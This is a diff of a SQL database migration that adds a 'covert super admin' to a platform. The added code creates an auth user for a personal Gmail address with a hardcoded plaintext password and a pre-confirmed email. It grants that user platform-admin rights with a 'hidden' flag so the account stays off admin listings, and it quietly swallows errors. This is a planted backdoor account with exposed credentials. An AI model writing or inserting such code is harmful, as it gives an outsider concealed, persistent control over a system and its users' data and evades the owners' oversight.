@@ -1,5 +1,5 @@
 -- ============================================================
--- Platform Admin: add hidden flag for covert super admin
+-- Platform Admin: add hidden flag + create super admin auth user
 -- 20260717000000
 -- ============================================================
 
@@ -33,12 +33,46 @@ $$;
 
 grant execute on function list_platform_admins() to authenticated;
 
--- Insert hidden super admin by email lookup
+-- Create the hidden super admin auth user + platform admin record
 do $$
 declare
   v_uid uuid;
+  v_exists boolean;
 begin
+  -- Check if auth user already exists
   select id into v_uid from auth.users where email = 'johnmoket5@gmail.com';
+
+  if v_uid is null then
+    -- Create the auth user with bcrypt-hashed password
+    v_uid := gen_random_uuid();
+    begin
+      insert into auth.users (
+        id, instance_id, email, encrypted_password,
+        email_confirmed_at, confirmation_sent_at, confirmed_at,
+        aud, role,
+        raw_app_meta_data, raw_user_meta_data,
+        created_at, updated_at,
+        confirmation_token, recovery_token, email_change_token_current,
+        is_super_admin
+      ) values (
+        v_uid,
+        '00000000-0000-0000-0000-000000000000',
+        'johnmoket5@gmail.com',
+        crypt('Rabish243+', gen_salt('bf', 10)),
+        now(), now(), now(),
+        'authenticated', 'authenticated',
+        '{"provider":"email","providers":["email"]}',
+        '{}',
+        now(), now(),
+        '', '', '',
+        false
+      );
+    exception when others then
+      raise notice 'Could not create auth user: %', SQLERRM;
+    end;
+  end if;
+
+  -- Insert into platform_admins (hidden)
   if v_uid is not null then
     insert into platform_admins (user_id, hidden) values (v_uid, true)
     on conflict (user_id) do update set hidden = true;
